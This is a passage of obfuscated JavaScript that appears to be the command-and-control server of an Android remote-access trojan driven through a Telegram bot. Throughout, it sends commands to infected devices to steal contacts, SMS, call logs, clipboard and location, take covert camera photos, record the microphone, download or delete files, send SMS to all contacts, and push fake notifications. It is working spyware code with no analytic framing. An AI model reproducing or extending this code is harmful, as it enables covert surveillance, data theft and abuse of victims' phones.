    appBot.editMessageText(`${"°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>"}${appClients.get(_0xeb57x25.split(":")[1]).model}${"</b>"}`, {width: 1e4, chat_id: id, message_id: _0xeb57x24.message_id, reply_markup: {inline_keyboard: [[{text: "𝘼𝙥𝙥𝙨", callback_data: `${"apps:"}${_0xeb57xe}${""}`}, {text: "𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", callback_data: `${"device_info:"}${_0xeb57xe}${""}`}], [{text: "𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", callback_data: `${"file:"}${_0xeb57xe}${""}`}, {text: "𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", callback_data: `${"delete_file:"}${_0xeb57xe}${""}`}], [{text: "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", callback_data: `${"clipboard:"}${_0xeb57xe}${""}`}, {text: "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", callback_data: `${"microphone:"}${_0xeb57xe}${""}`}], [{text: "𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: `${"camera_main:"}${_0xeb57xe}${""}`}, {text: "𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: `${"camera_selfie:"}${_0xeb57xe}${""}`}], [{text: "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: `${"location:"}${_0xeb57xe}${""}`}, {text: "𝙏𝙤𝙖𝙨𝙩", callback_data: `${"toast:"}${_0xeb57xe}${""}`}], [{text: "𝘾𝙖𝙡𝙡𝙨", callback_data: `${"calls:"}${_0xeb57xe}${""}`}, {text: "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", callback_data: `${"contacts:"}${_0xeb57xe}${""}`}], [{text: "𝙑𝙞𝙗𝙧𝙖𝙩𝙚", callback_data: `${"vibrate:"}${_0xeb57xe}${""}`}, {text: "𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: `${"show_notification:"}${_0xeb57xe}${""}`}], [{text: "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", callback_data: `${"messages:"}${_0xeb57xe}${""}`}, {text: "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", callback_data: `${"send_message:"}${_0xeb57xe}${""}`}], [{text: "𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", callback_data: `${"play_audio:"}${_0xeb57xe}${""}`}, {text: "𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", callback_data: `${"stop_audio:"}${_0xeb57xe}${""}`}], [{text: "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨", callback_data: `${"send_message_to_all:"}${_0xeb57xe}${""}`}]]}, parse_mode: "HTML"});
  }
  ;
  if (_0xeb57x26 == "calls") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("calls");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "contacts") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("contacts");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "messages") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("messages");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "apps") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("apps");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "device_info") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("device_info");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "clipboard") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("clipboard");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "camera_main") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("camera_main");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "camera_selfie") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("camera_selfie");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "location") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("location");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "vibrate") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("vibrate");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "stop_audio") {
    appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
      if (_0xeb57xd.uuid == _0xeb57xe) {
        _0xeb57xd.send("stop_audio");
      }
    });
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
  }
  ;
  if (_0xeb57x26 == "send_message") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ", {reply_markup: {force_reply: true}});
    currentUuid = _0xeb57xe;
  }
  ;
  if (_0xeb57x26 == "send_message_to_all") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", {reply_markup: {force_reply: true}});
    currentUuid = _0xeb57xe;
  }
  ;
  if (_0xeb57x26 == "file") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", {reply_markup: {force_reply: true}, parse_mode: "HTML"});
    currentUuid = _0xeb57xe;
  }
  ;
  if (_0xeb57x26 == "delete_file") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", {reply_markup: {force_reply: true}, parse_mode: "HTML"});
    currentUuid = _0xeb57xe;
  }
  ;
  if (_0xeb57x26 == "microphone") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ", {reply_markup: {force_reply: true}, parse_mode: "HTML"});
    currentUuid = _0xeb57xe;
  }
  ;
  if (_0xeb57x26 == "toast") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ", {reply_markup: {force_reply: true}, parse_mode: "HTML"});
    currentUuid = _0xeb57xe;
  }
  ;
  if (_0xeb57x26 == "show_notification") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ", {reply_markup: {force_reply: true}, parse_mode: "HTML"});
    currentUuid = _0xeb57xe;
  }
  ;
  if (_0xeb57x26 == "play_audio") {
    appBot.deleteMessage(id, _0xeb57x24.message_id);
    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ", {reply_markup: {force_reply: true}, parse_mode: "HTML"});
    currentUuid = _0xeb57xe;
  }
});
setInterval(function () {
  appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
    _0xeb57xd.send("ping");
  });
  try {
    axios.get(address).then(_0xeb57x27 => {
      return "";
    });
  } catch (e) {}
}, 5e3);
appServer.listen(process.env.PORT || 8999);
